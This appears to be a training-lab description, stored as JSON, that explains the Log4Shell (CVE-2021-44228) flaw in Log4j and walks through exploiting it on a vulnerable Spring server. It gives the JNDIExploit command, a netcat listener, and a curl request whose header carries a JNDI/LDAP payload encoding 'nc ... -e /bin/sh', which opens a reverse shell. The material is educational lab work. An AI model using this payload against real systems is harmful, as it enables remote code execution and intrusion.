{"description":"In this lab we will show the exploit Log4Shell with the using of a vulnearble app (Spring) and a malicious LDAP server.","goal":"<p class=\"Corpo\" style=\"text-align: justify;\">In this lab we will show <em><strong>Log4Shell 0-day Exploit</strong></em>, <strong><em>CVE-2021-44228</em></strong>, of <strong><em>Log4j library.</em></strong> The version affected by this explioit are 2.15 and lower.</p>\n<p class=\"Corpo\" style=\"text-align: justify;\">Log4j package is distributed under the Apache Software license, is open source, and is one of the many Java libraries used for logging.</p>\n<p class=\"Corpo\" style=\"text-align: justify;\">It is commonly used as it is fast, dynamic, scalable and provides the possibility to use external plugins.</p>\n<p class=\"Corpo\" style=\"text-align: justify;\">The principal features are:</p>\n<ol>\n<li class=\"Corpo\" style=\"text-align: justify;\">Logger: which manages the log output;</li>\n<li class=\"Corpo\" style=\"text-align: justify;\">Appender: which checks the output;</li>\n<li class=\"Corpo\" style=\"text-align: justify;\">Layout: how show the output.</li>\n</ol>\n<p class=\"Corpo\" style=\"text-align: justify;\">Among the various plugin that can be used, one of them is <strong>Lookup</strong>. It allows to dynamically add values to Log4j configuration or logging files. In order to do this, load the following code in the log: <em><strong>${java:version}</strong></em>, obtaining the desired value.</p>\n<p class=\"Corpo\" style=\"text-align: justify;\">The plug-in that allows you to do the exploit&nbsp; is <em><strong>JNDI</strong></em> (Java Name Directory Interface) with the <strong><em>JNDILookup</em></strong> method. The function of interest is <em>ctx.lookup(\"java: /com/env\")</em>. If an attacker has the ability to control that object, it is possible to make external JNDI calls via a malicious <em><strong>LDAP</strong></em> server (like in our case).&nbsp;</p>\n<p class=\"Corpo\" style=\"text-align: justify;\">Exploit requirements:</p>\n<ul>\n<li class=\"Corpo\" style=\"text-align: justify;\">A server with a vulnerable Log4j version (in our case Spring)</li>\n<li class=\"Corpo\" style=\"text-align: justify;\">An exploit with protocol (such as HTTP), that allows an attacker to send exploit string</li>\n<li class=\"Corpo\" style=\"text-align: justify;\">A LDAP malicious server</li>\n</ul>\n<p class=\"Corpo\" style=\"text-align: justify;\">How does it work?<img src=\"images/CURL.PNG\" alt=\"\" /></p>\n<p class=\"Corpo\" style=\"text-align: justify;\">The attacker makes an HTTP request to a vulnerable Spring server that logs with Log4j. Through a <em><strong>jndi injection</strong></em>, with the string \"<em>jndi</em>\", we are redirecting the target server to the malicious LDAP server through an \"<em>ldap</em>\" request (<em><strong>jndi_lookup</strong></em>). The malicious LDAP server responds to the target server via a URL indicating where to get the <em>.class </em>file. Finally, the target server will have taken the compiled java file and the exploit will have been successful, obtaining an <em><strong>RCE</strong></em>.</p>\n<p class=\"Corpo\"><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://firebasestorage.googleapis.com/v0/b/immns-cdb8f.appspot.com/o/Log4Shell_Imm.PNG?alt=media&amp;token=790144ec-64c0-40c1-8fd0-815dbfff6ec3\" alt=\"\" width=\"1024\" height=\"768\" /></p>\n<p class=\"Corpo\" style=\"text-align: justify;\">How to obtain Remote Code Execution:</p>\n<ol>\n<li class=\"Corpo\" style=\"text-align: justify;\">The JNDIExploit tool that we use can start its own LDAP server on port 1389 and a HTTP server on port 8888 and is capable of receiving different types of payloads, including command execution. The command is: java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 193.20.1.3 -p 8888</li>\n<li class=\"Corpo\" style=\"text-align: justify;\">Execute the command on netcat host: nc -lvp 8889. In this way we listen through netcat on port 8889</li>\n<li class=\"Corpo\" style=\"text-align: justify;\">execute the command on the client host: curl http://193.20.1.2:8080 -H 'X-Api-Version: ${jndi:ldap://193.20.1.3:1389/Basic/Command/Base64/bmMgMTkzLjIwLjEuNCA4ODg5IC1lIC9iaW4vc2g=}'&nbsp;&nbsp;. This command allows to send an HTTP request to the target server with custom header (-H). The payload of the header allows to do a JNDI injection and send a query to the LDAP server. The encoded command is &ldquo;193.20.1.4 8889 -e /bin/sh&rdquo;. It allows to execute a shell on the netcat host which is, in fact, listening on port 8889.</li>\n</ol>\n<p>Once done these commands, we will obtain a reverse shell.&nbsp;</p>","solution":"","readme":"","author":"Francesco19"}
